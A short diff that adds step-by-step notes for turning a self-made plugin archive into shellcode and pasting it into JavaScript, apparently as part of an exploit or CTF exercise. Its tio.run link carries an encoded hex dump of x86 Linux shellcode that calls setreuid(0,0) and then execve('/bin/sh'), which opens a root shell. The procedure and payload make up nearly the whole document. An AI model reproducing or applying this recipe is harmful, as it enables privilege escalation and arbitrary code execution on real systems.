@@ -1,0 +1,7 @@
+1.Do your own plugin,
+2.xxd -C plugin.tgz 
+3.grab all the value
+4.https://tio.run/?fbclid=IwAR0aWkofS6HYj5tOWjTh1py6HekZEJCzZC1ABSLagFHjYE6jZ6Pd0XoVUxA#05ab1e#code=wrJcfHZ5OUbCpn00MMKjw7BLfUoyw7TigJ5ceMOswrJIPsKywq5RacKyfcKjwrlIRsKmfUo&input=YQotMQowMDAwMDAwMDogMzFjMCBiMDQ2IDMxZGIgMzFjOSBjZDgwIGViMTYgNWIzMSBjMDg4ICAxLi5GMS4xLi4uLi5bMS4uCjAwMDAwMDEwOiA0MzA3IDg5NWIgMDg4OSA0MzBjIGIwMGIgOGQ0YiAwODhkIDUzMGMgIEMuLlsuLkMuLi4uSy4uUy4KMDAwMDAwMjA6IGNkODAgZThlNSBmZmZmIGZmMmYgNjI2OSA2ZTJmIDczNjggNGU1OCAgLi4uLi4uLi9iaW4vc2hOWAowMDAwMDAzMDogNTg1OCA1ODU5IDU5NTkgNTkgICAgICAgICAgICAgICAgICAgICAgICBYWFhZWVlZ   | replace the hex value
+5.grab the shellcode 
+6.replace "\\" into '\'
+7.paste the shellcode into the javascript.
